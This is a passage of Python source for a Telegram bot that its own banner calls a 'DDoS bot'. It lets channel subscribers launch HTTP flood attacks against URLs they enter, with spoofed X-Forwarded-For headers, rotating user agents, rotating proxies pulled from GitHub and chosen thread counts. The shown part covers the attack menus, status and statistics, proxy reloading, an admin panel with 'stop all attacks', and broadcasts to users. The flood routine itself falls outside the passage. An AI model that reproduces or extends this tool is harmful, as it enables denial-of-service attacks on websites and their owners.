        keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
        return
    
    await show_attack_status(chat_id, context)
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
    await update.message.reply_text("🔙 Click below to go back:", reply_markup=InlineKeyboardMarkup(keyboard))

@require_subscription
async def reload_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    msg = await update.message.reply_text("🔄 Fetching fresh proxies from GitHub...")
    raw = fetch_proxies()
    if raw:
        working = validate_proxies(raw)
        proxy_pools[chat_id] = working
        await msg.edit_text(
            f"✅ PROXY UPDATED\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Loaded: {len(working)} working proxies"
        )
    else:
        await msg.edit_text("❌ Failed to fetch proxies. Try again later.")
    
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
    await update.message.reply_text("🔙 Click below to go back:", reply_markup=InlineKeyboardMarkup(keyboard))

@require_subscription
async def my_stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    stats = user_stats.get(user_id, {})
    total = stats.get('total_attacks', 0)
    join_date = stats.get('join_date', 'N/A')
    last_used = stats.get('last_used', 'N/A')
    
    history = attack_history.get(user_id, [])[-5:]
    history_text = "\n".join([f"• {h['url'][:30]}... ({h['status']})" for h in history]) if history else "No history"
    
    msg = (
        f"📊 MY STATISTICS\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"👤 Name: {stats.get('first_name', 'N/A')}\n"
        f"🆔 ID: {user_id}\n"
        f"🎯 Total Attacks: {total}\n"
        f"✅ Verified: {'✅' if user_id in verified_users else '❌'}\n"
        f"📅 Joined: {join_date}\n"
        f"⏱️ Last Used: {last_used}\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📋 Recent:\n{history_text}"
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

@require_subscription
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📖 HELP GUIDE\n"
        "━━━━━━━━━━━━━━━━━━━\n\n"
        "⚔️ ATTACK METHODS:\n"
        "🔥 Method 1 – X-Forwarded-For Spoofing\n"
        "⚡ Method 2 – User-Agent Rotation\n"
        "💀 Method 3 – Advanced Browser Headers\n\n"
        "🔄 PROXY ROTATION:\n"
        "Auto-fetches HTTP proxies from GitHub\n\n"
        "📌 COMMANDS:\n"
        "/start – Main menu\n"
        "/stop – Stop attack\n"
        "/status – Live stats\n"
        "/reload_proxies – Refresh proxies\n"
        "/my_stats – Your statistics\n\n"
        "⚠️ Use responsibly!\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        "👑 For support, use 'Contact Admin' button."
    )
    keyboard = [[InlineKeyboardButton("🔙 Back to Menu", callback_data='back_to_main')]]
    await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))

# ==================== BROADCAST SYSTEM (ADMIN ONLY) ====================
@admin_only
async def broadcast_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("📝 Text Message", callback_data='broadcast_text')],
        [InlineKeyboardButton("🖼️ Photo", callback_data='broadcast_photo')],
        [InlineKeyboardButton("🎥 Video", callback_data='broadcast_video')],
        [InlineKeyboardButton("👤 Specific User", callback_data='broadcast_user')],
        [InlineKeyboardButton("🔙 Back to Admin", callback_data='admin_back')]
    ]
    
    await update.message.reply_text(
        "📢 BROADCAST SYSTEM\n"
        "━━━━━━━━━━━━━━━━━━━\n"
        f"👥 Total Users: {len(user_stats)}\n"
        f"✅ Verified: {len(verified_users)}\n"
        f"🟢 Online: {len([x for x in active_attacks.values() if x])}\n\n"
        "Select broadcast type:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )
    return BROADCAST_TYPE

@admin_only
async def broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'broadcast_text':
        await query.edit_message_text(
            "📝 Send your broadcast message:\n\n"
            "💡 Tip: Use emojis and formatting for better engagement\n\n"
            "🔙 Type /cancel to go back"
        )
        return BROADCAST_TEXT
    
    elif data == 'broadcast_photo':
        await query.edit_message_text(
            "🖼️ Send photo with caption (optional):\n\n"
            "📌 Format: Send as file or compressed\n\n"
            "🔙 Type /cancel to go back"
        )
        return BROADCAST_PHOTO
    
    elif data == 'broadcast_video':
        await query.edit_message_text(
            "🎥 Send video with caption (optional):\n\n"
            "📌 Format: Send as file or compressed\n\n"
            "🔙 Type /cancel to go back"
        )
        return BROADCAST_VIDEO
    
    elif data == 'broadcast_user':
        await query.edit_message_text(
            "👤 Enter user ID to send message:\n\n"
            "📌 Example: 123456789\n"
            "Type 'all' for all users\n\n"
            "🔙 Type /cancel to go back"
        )
        return TARGET_USER
    
    return ConversationHandler.END

@admin_only
async def process_broadcast_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text(
        "📤 Sending broadcast...\n"
        f"👥 Total: {len(user_stats)} users"
    )
    
    for uid in user_stats.keys():
        try:
            await context.bot.send_message(chat_id=uid, text=msg_text)
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ BROADCAST COMPLETE\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"👥 Total: {len(user_stats)}\n"
        f"📊 Success Rate: {round((sent/(sent+failed))*100,1)}%"
    )
    return ConversationHandler.END

@admin_only
async def process_broadcast_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    photo = update.message.photo[-1]
    caption = update.message.caption or "📸 Broadcast Photo"
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text("📤 Sending broadcast photos...")
    
    for uid in user_stats.keys():
        try:
            await context.bot.send_photo(chat_id=uid, photo=photo.file_id, caption=caption)
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ BROADCAST COMPLETE\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"🖼️ Type: Photo"
    )
    return ConversationHandler.END

@admin_only
async def process_broadcast_video(update: Update, context: ContextTypes.DEFAULT_TYPE):
    video = update.message.video
    caption = update.message.caption or "🎥 Broadcast Video"
    
    sent = 0
    failed = 0
    
    status_msg = await update.message.reply_text("📤 Sending broadcast videos...")
    
    for uid in user_stats.keys():
        try:
            await context.bot.send_video(chat_id=uid, video=video.file_id, caption=caption)
            sent += 1
            time.sleep(0.05)
        except:
            failed += 1
    
    await status_msg.edit_text(
        f"✅ BROADCAST COMPLETE\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"📤 Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"🎥 Type: Video"
    )
    return ConversationHandler.END

@admin_only
async def process_broadcast_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_input = update.message.text.strip()
    
    if user_input.lower() == 'all':
        await update.message.reply_text("Please use the normal broadcast option for all users.")
        return ConversationHandler.END
    
    try:
        target_id = int(user_input)
        await update.message.reply_text(
            f"👤 Target User: {target_id}\n"
            "📝 Send your message:\n\n"
            "🔙 Type /cancel to go back"
        )
        context.user_data['target_user_id'] = target_id
        return CUSTOM_MSG
    except:
        await update.message.reply_text("❌ Invalid user ID! Please enter a number.")
        return TARGET_USER

@admin_only
async def process_custom_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    target_id = context.user_data.get('target_user_id')
    msg = update.message.text
    
    try:
        await context.bot.send_message(chat_id=target_id, text=f"📨 Admin Message:\n\n{msg}")
        await update.message.reply_text(f"✅ Message sent to user {target_id}")
    except:
        await update.message.reply_text(f"❌ Failed to send message to {target_id}")
    
    return ConversationHandler.END

# ==================== ADMIN PANEL ====================
@admin_only
async def admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    total_users = len(user_stats)
    total_attacks = len([x for x in active_attacks.values() if x])
    total_verified = len(verified_users)
    total_requests = sum(s.get('total', 0) for s in attack_stats.values())
    total_success = sum(s.get('success', 0) for s in attack_stats.values())
    
    keyboard = [
        [InlineKeyboardButton("👥 Total Users", callback_data='admin_users')],
        [InlineKeyboardButton("📊 Attack Stats", callback_data='admin_stats')],
        [InlineKeyboardButton("📢 Broadcast", callback_data='admin_broadcast')],
        [InlineKeyboardButton("🔄 Force Reload Proxies", callback_data='admin_reload')],
        [InlineKeyboardButton("🛑 Stop All Attacks", callback_data='admin_stop_all')],
        [InlineKeyboardButton("💀 Clear All Data", callback_data='admin_clear')],
        [InlineKeyboardButton("📊 System Info", callback_data='admin_system')],
        [InlineKeyboardButton("🔙 Back to Main", callback_data='back_to_main')]
    ]
    
    msg = (
        f"👑 ADMIN CONTROL PANEL\n"
        f"╔══════════════════════════════════╗\n"
        f"║ 👥 Total Users       : {total_users}\n"
        f"║ ✅ Verified Users    : {total_verified}\n"
        f"║ 🔥 Active Attacks   : {total_attacks}\n"
        f"║ 📥 Total Requests   : {total_requests:,}\n"
        f"║ ✅ Success Rate     : {round((total_success/max(total_requests,1))*100,1)}%\n"
        f"║ 🟢 Bot Status      : Online\n"
        f"║ ⏰ Time            : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"╚══════════════════════════════════╝\n"
        f"🔹 Admin: {ADMIN_USERNAME}\n"
        f"📌 Version: {BOT_VERSION}"
    )
    
    if update.message:
        await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    else:
        await update.callback_query.edit_message_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
    return ConversationHandler.END

# ==================== ADMIN CALLBACK ====================
@admin_only
async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == 'admin_users':
        if not user_stats:
            await query.edit_message_text("📭 No users yet.")
            return
        
        msg = "👥 USER LIST\n╔══════════════════════════════════╗\n"
        for uid, data in user_stats.items():
            msg += f"║ 🆔 {uid}\n"
            msg += f"║ 👤 {data.get('first_name', 'N/A')}"
            if data.get('username') and data['username'] != 'N/A':
                msg += f" (@{data['username']})"
            msg += f"\n║ 🎯 Attacks: {data.get('total_attacks', 0)}\n"
            msg += f"║ ✅ {'✅' if uid in verified_users else '❌'}\n"
            msg += f"║ ⏱️ {data['last_used']}\n"
            msg += "╠══════════════════════════════════╣\n"
        msg += f"║ 📌 Total: {len(user_stats)}\n╚══════════════════════════════════╝"
        await query.edit_message_text(msg)
    
    elif data == 'admin_stats':
        total_attacks = len([x for x in active_attacks.values() if x])
        total_requests = sum(s.get('total', 0) for s in attack_stats.values())
        total_success = sum(s.get('success', 0) for s in attack_stats.values())
        total_failed = sum(s.get('failed', 0) for s in attack_stats.values())
        
        msg = (
            f"📊 GLOBAL STATISTICS\n"
            f"╔══════════════════════════════════╗\n"
            f"║ 🔥 Active Attacks   : {total_attacks}\n"
            f"║ 📥 Total Requests   : {total_requests:,}\n"
            f"║ ✅ Successful       : {total_success:,}\n"
            f"║ ❌ Failed          : {total_failed:,}\n"
            f"║ 📈 Success Rate    : {round((total_success/max(total_requests,1))*100,1)}%\n"
            f"║ 👥 Total Users     : {len(user_stats)}\n"
            f"║ ✅ Verified Users  : {len(verified_users)}\n"
            f"╚══════════════════════════════════╝"
        )
        await query.edit_message_text(msg)
    
    elif data == 'admin_broadcast':
        keyboard = [
            [InlineKeyboardButton("📝 Text Message", callback_data='broadcast_text')],
            [InlineKeyboardButton("🖼️ Photo", callback_data='broadcast_photo')],
            [InlineKeyboardButton("🎥 Video", callback_data='broadcast_video')],
            [InlineKeyboardButton("👤 Specific User", callback_data='broadcast_user')],
            [InlineKeyboardButton("🔙 Back", callback_data='admin_back')]
        ]
        await query.edit_message_text(
            "📢 BROADCAST SYSTEM\n"
            "━━━━━━━━━━━━━━━━━━━\n"
            f"👥 Total Users: {len(user_stats)}\n"
            f"✅ Verified: {len(verified_users)}\n\n"
            "Select broadcast type:",
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return BROADCAST_TYPE
    
    elif data == 'admin_reload':
        await query.edit_message_text("🔄 Fetching fresh proxies globally...")
        raw = fetch_proxies()
        if raw:
            working = validate_proxies(raw)
            proxy_pools.clear()
            for chat_id in user_stats.keys():
                proxy_pools[chat_id] = working.copy()
            await query.edit_message_text(
                f"✅ PROXY UPDATED\n"
                f"━━━━━━━━━━━━━━━━━━━\n"
                f"🌐 Loaded: {len(working)} proxies globally"
            )
        else:
            await query.edit_message_text("❌ Failed to fetch proxies.")
    
    elif data == 'admin_stop_all':
        stopped = 0
        for chat_id in list(active_attacks.keys()):
            if active_attacks.get(chat_id):
                stop_attack(chat_id)
                stopped += 1
        await query.edit_message_text(
            f"✅ STOPPED ALL\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🛑 Stopped: {stopped} attacks"
        )
    
    elif data == 'admin_clear':
        active_attacks.clear()
        attack_stats.clear()
        proxy_pools.clear()
        verified_users.clear()
        user_cooldown.clear()
        await query.edit_message_text("💀 All data cleared successfully!")
    
    elif data == 'admin_system':
        msg = (
            f"📊 SYSTEM INFO\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"🔋 Process : {len(active_attacks)} active\n"
            f"🧵 Threads : {sum([x.get('threads',0) for x in attack_stats.values()])}\n"
            f"🤖 Bot     : v{BOT_VERSION}\n"
            f"👥 Users   : {len(user_stats)}\n"
            f"✅ Verified: {len(verified_users)}"
        )
        await query.edit_message_text(msg)
    
    elif data == 'admin_back':
        first_name = "Admin"
        await show_main_menu(update, context, first_name)
        return ConversationHandler.END
    
    return ConversationHandler.END

# ==================== HIDDEN ADMIN COMMAND ====================
@admin_only
async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await admin_panel(update, context)

# ==================== HEALTH CHECK ====================
async def health_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🤖 Bot Status: Online\n"
        f"📌 Version: {BOT_VERSION}\n"
        f"👥 Users: {len(user_stats)}\n"
        f"✅ Verified: {len(verified_users)}\n"
        f"🔥 Active: {len([x for x in active_attacks.values() if x])}"
    )

# ==================== ATTACK MONITOR ====================
async def monitor_attacks(context: ContextTypes.DEFAULT_TYPE):
    for chat_id in list(active_attacks.keys()):
        if active_attacks.get(chat_id):
            await show_attack_status(chat_id, context)

# ==================== MAIN FUNCTION ====================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()
        
        conv_handler = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(button_callback, pattern='^start_attack$'),
                CallbackQueryHandler(verify_join_callback, pattern='^verify_join$'),
                CallbackQueryHandler(check_again_callback, pattern='^check_again$')
            ],
            states={
                URL_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_url)],
                METHOD_SELECT: [CallbackQueryHandler(method_selection, pattern='^(method1|method2|method3|back_to_main)$')],
                THREADS_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, receive_threads)],
                PROXY_SELECT: [CallbackQueryHandler(proxy_selection, pattern='^(proxy_yes|proxy_no|back_to_main)$')],
                VERIFY_WAIT: [
                    CallbackQueryHandler(verify_join_callback, pattern='^verify_join$'),
                    CallbackQueryHandler(check_again_callback, pattern='^check_again$')
                ],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
        )
        
        broadcast_handler = ConversationHandler(
            entry_points=[
                CallbackQueryHandler(broadcast_callback, pattern='^broadcast_'),
            ],
            states={
                BROADCAST_TYPE: [CallbackQueryHandler(broadcast_callback, pattern='^broadcast_')],
                BROADCAST_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast_text)],
                BROADCAST_PHOTO: [MessageHandler(filters.PHOTO, process_broadcast_photo)],
                BROADCAST_VIDEO: [MessageHandler(filters.VIDEO, process_broadcast_video)],
                TARGET_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_broadcast_user)],
                CUSTOM_MSG: [MessageHandler(filters.TEXT & ~filters.COMMAND, process_custom_message)],
            },
            fallbacks=[CommandHandler('cancel', cancel)],
            per_chat=False,
        )
        
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler(ADMIN_COMMAND, admin_command))
        app.add_handler(CommandHandler("health", health_command))
        app.add_handler(conv_handler)
        app.add_handler(broadcast_handler)
        app.add_handler(CommandHandler("stop", stop_command))
        app.add_handler(CommandHandler("status", status_command))
        app.add_handler(CommandHandler("reload_proxies", reload_proxies_command))
        app.add_handler(CommandHandler("my_stats", my_stats_command))
        app.add_handler(CommandHandler("help", help_command))
        
        app.add_handler(CallbackQueryHandler(verify_join_callback, pattern='^verify_join$'))
        app.add_handler(CallbackQueryHandler(check_again_callback, pattern='^check_again$'))
        app.add_handler(CallbackQueryHandler(button_callback, pattern='^(stop|status|reload_proxies|help|start_attack|my_stats|back_to_main|admin_panel)$'))
        app.add_handler(CallbackQueryHandler(admin_callback, pattern='^admin_'))
        
        job_queue = app.job_queue
        if job_queue:
            job_queue.run_repeating(monitor_attacks, interval=5, first=0)
        
        print("=" * 50)
        print("💀 DARKNET CYBER FORCE DDOS BOT")
        print("=" * 50)
        print(f"🤖 Status: Online")
        print(f"👑 Admin ID: {ADMIN_ID}")
        print(f"👑 Admin: {ADMIN_USERNAME}")
        print(f"🔑 Admin Command: /{ADMIN_COMMAND}")
        print(f"📢 Channel: {CHANNEL_URL}")
        print(f"📌 Version: {BOT_VERSION}")
        print("=" * 50)
        print("✅ Bot is running...")
        print("=" * 50)
        print("📌 All users can attack after joining channel")
        print("👑 Admin panel: /mahmud101")
        print("=" * 50)
        
        app.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES
        )
        
    except Exception as e:
        logger.error(f"Bot crashed: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
